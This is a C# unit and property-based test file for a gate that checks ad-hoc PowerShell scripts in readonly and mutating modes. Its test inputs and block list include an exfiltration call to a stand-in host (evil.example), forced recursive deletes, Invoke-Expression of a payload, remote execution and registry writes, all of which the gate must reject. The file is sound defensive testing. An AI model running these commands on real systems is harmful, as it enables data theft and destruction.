using FluentAssertions;
using KrakenDeploy.Server.Core.Domain.Ai;
using KrakenDeploy.Server.Data.Services.Ai.Adhoc;

namespace KrakenDeploy.Server.Data.Tests;

/// <summary>
/// Unit + property-based tests for the M11.E.3 / M11.E.15 static-analysis gate
/// (<see cref="AdhocScriptGate"/>). Pure (no Postgres) so they run fast.
/// </summary>
public sealed class AdhocScriptGateTests
{
    // ── Readonly allowlist ───────────────────────────────────────────────────

    [Theory]
    [InlineData("Get-Process")]
    [InlineData("Get-Service | Where-Object { $_.Status -eq 'Running' }")]
    [InlineData("Get-ChildItem C:\\ | Select-Object Name, Length | Sort-Object Length")]
    [InlineData("Get-PSDrive C | Format-Table -AutoSize")]
    [InlineData("Test-Path C:\\Windows")]
    [InlineData("Measure-Object")]
    [InlineData("Get-Process | ForEach-Object { Write-Host $_.Name }")]
    [InlineData("Get-Content C:\\log.txt | Select-String 'error' | Measure-Object")]
    public void Readonly_allows_get_test_measure_and_safe_utilities(string script)
    {
        var result = AdhocScriptGate.Analyze(script, AdhocMode.Readonly);
        result.IsAllowed.Should().BeTrue(result.Summary);
    }

    [Theory]
    [InlineData("Stop-Service -Name w3svc")]
    [InlineData("Restart-Computer")]
    [InlineData("Set-Content C:\\x.txt 'hi'")]
    [InlineData("Remove-Item C:\\x.txt")]
    [InlineData("Invoke-WebRequest https://evil.example/exfil")]
    [InlineData("Invoke-RestMethod https://evil.example")]
    [InlineData("ipconfig /all")]
    [InlineData("New-Service -Name n -BinaryPathName b")]
    public void Readonly_rejects_anything_not_on_the_allowlist_as_mode_escalation(string script)
    {
        var result = AdhocScriptGate.Analyze(script, AdhocMode.Readonly);

        result.IsAllowed.Should().BeFalse();
        result.IsModeEscalation.Should().BeTrue(
            "a non-readonly command in a readonly session is a mode-escalation attempt");
    }

    [Fact]
    public void Readonly_rejects_mutating_command_hidden_in_a_nested_script_block()
    {
        // The gate descends into nested blocks — a mutating command can't hide
        // inside ForEach-Object { … }.
        const string script = "Get-Process | ForEach-Object { Remove-Item C:\\$($_.Id).tmp }";

        var result = AdhocScriptGate.Analyze(script, AdhocMode.Readonly);

        result.IsAllowed.Should().BeFalse();
        result.Violations.Should().Contain(v => v.CommandName == "Remove-Item");
    }

    // ── Mutating blocklist ───────────────────────────────────────────────────

    [Theory]
    [InlineData("Stop-Service -Name w3svc")]
    [InlineData("Restart-Service w3svc")]
    [InlineData("Set-Content C:\\app\\config.json $json")]
    [InlineData("Remove-Item C:\\temp\\old.log")]
    [InlineData("New-Item -Path C:\\temp\\f.txt -ItemType File")]
    [InlineData("Set-Service -Name w3svc -StartupType Automatic")]
    [InlineData("Invoke-Command -ScriptBlock { Get-Date }")]
    public void Mutating_allows_state_changing_commands_outside_the_blocklist(string script)
    {
        var result = AdhocScriptGate.Analyze(script, AdhocMode.Mutating);
        result.IsAllowed.Should().BeTrue(result.Summary);
    }

    [Theory]
    [InlineData("Invoke-Expression $code", AdhocViolationKind.ForbiddenCmdlet)]
    [InlineData("iex $code", AdhocViolationKind.ForbiddenCmdlet)]
    [InlineData("Add-Type -TypeDefinition 'public class X {}'", AdhocViolationKind.ForbiddenCmdlet)]
    [InlineData("Invoke-Command -ComputerName srv01 { Get-Date }", AdhocViolationKind.ForbiddenRemoting)]
    [InlineData("Invoke-Command -Cn srv01 { Get-Date }", AdhocViolationKind.ForbiddenRemoting)]
    [InlineData("Remove-Item -Recurse -Force C:\\data", AdhocViolationKind.DestructiveDelete)]
    [InlineData("del -Recurse -Force C:\\data", AdhocViolationKind.DestructiveDelete)]
    [InlineData("New-Service -Name n -BinaryPathName c:\\b.exe", AdhocViolationKind.ServiceLifecycle)]
    [InlineData("Remove-Service -Name n", AdhocViolationKind.ServiceLifecycle)]
    [InlineData("Set-ItemProperty -Path HKLM:\\Software\\X -Name Y -Value 1", AdhocViolationKind.RegistryWrite)]
    [InlineData("New-Item -Path HKLM:\\Software\\X", AdhocViolationKind.RegistryWrite)]
    public void Mutating_rejects_forbidden_constructs(string script, AdhocViolationKind expectedKind)
    {
        var result = AdhocScriptGate.Analyze(script, AdhocMode.Mutating);

        result.IsAllowed.Should().BeFalse();
        result.Violations.Should().Contain(v => v.Kind == expectedKind, result.Summary);
    }

    [Theory]
    [InlineData("& $cmd -Force")]
    [InlineData(". $scriptPath")]
    [InlineData("& (Get-Command Remove-Item)")]
    public void Dynamic_invocation_is_rejected_in_both_modes(string script)
    {
        AdhocScriptGate.Analyze(script, AdhocMode.Mutating).IsAllowed.Should().BeFalse();
        AdhocScriptGate.Analyze(script, AdhocMode.Readonly).IsAllowed.Should().BeFalse();
    }

    [Fact]
    public void Unparseable_script_fails_closed()
    {
        var result = AdhocScriptGate.Analyze("Get-Process | { unterminated", AdhocMode.Readonly);

        result.IsAllowed.Should().BeFalse();
        result.Violations.Should().Contain(v => v.Kind == AdhocViolationKind.ParseError);
    }

    // ── Property-based (M11.E.17) ────────────────────────────────────────────

    /// <summary>
    /// Forbidden cmdlets in canonical + alias form. Each MUST trip the gate
    /// regardless of which "iteration" produced the script or what benign
    /// lines surround it.
    /// </summary>
    private static readonly string[] ForbiddenSnippets =
    [
        "Invoke-Expression $payload",
        "iex $payload",
        "Invoke-Command -ComputerName srv01 { Get-Date }",
        "Remove-Item -Recurse -Force C:\\data\\dir",
        "del -Recurse -Force C:\\data\\dir",
        "New-Service -Name svc -BinaryPathName c:\\svc.exe",
        "Remove-Service -Name svc",
        "Set-ItemProperty -Path HKLM:\\Software\\Kraken -Name K -Value 1",
        "New-ItemProperty -Path HKCU:\\Software\\Kraken -Name K -Value 1",
        "Add-Type -TypeDefinition 'public class P {}'",
        "New-Item -Path HKLM:\\Software\\Kraken",
    ];

    private static readonly string[] BenignLines =
    [
        "Get-Process | Select-Object Name, Id",
        "Get-Service | Where-Object { $_.Status -eq 'Running' }",
        "$free = Get-PSDrive C",
        "Write-Host \"checking\"",
        "Get-ChildItem C:\\Windows | Measure-Object",
    ];

    [Fact]
    public void Property_gate_trips_on_every_forbidden_cmdlet_across_random_multi_iteration_sessions()
    {
        // Deterministic seed so a failure is reproducible.
        var rng = new Random(20260527);

        const int sessions = 50;
        for (var s = 0; s < sessions; s++)
        {
            var iterations = rng.Next(1, 6); // 1..5 turns per session
            for (var iter = 0; iter < iterations; iter++)
            {
                // Build a script of benign lines with exactly one forbidden
                // construct spliced in at a random position.
                var lineCount = rng.Next(0, 4);
                var lines = new List<string>();
                for (var i = 0; i < lineCount; i++)
                {
                    lines.Add(BenignLines[rng.Next(BenignLines.Length)]);
                }
                var forbidden = ForbiddenSnippets[rng.Next(ForbiddenSnippets.Length)];
                lines.Insert(rng.Next(lines.Count + 1), forbidden);
                var script = string.Join(Environment.NewLine, lines);

                // Mutating mode: the blocklist must trip.
                var mutating = AdhocScriptGate.Analyze(script, AdhocMode.Mutating);
                mutating.IsAllowed.Should().BeFalse(
                    $"session {s} iter {iter} contains a forbidden cmdlet:\n{script}\n=> {mutating.Summary}");

                // Readonly mode: it must trip too (allowlist is strictly tighter).
                var readonlyResult = AdhocScriptGate.Analyze(script, AdhocMode.Readonly);
                readonlyResult.IsAllowed.Should().BeFalse(
                    $"session {s} iter {iter} (readonly) must reject:\n{script}");
            }
        }
    }
}
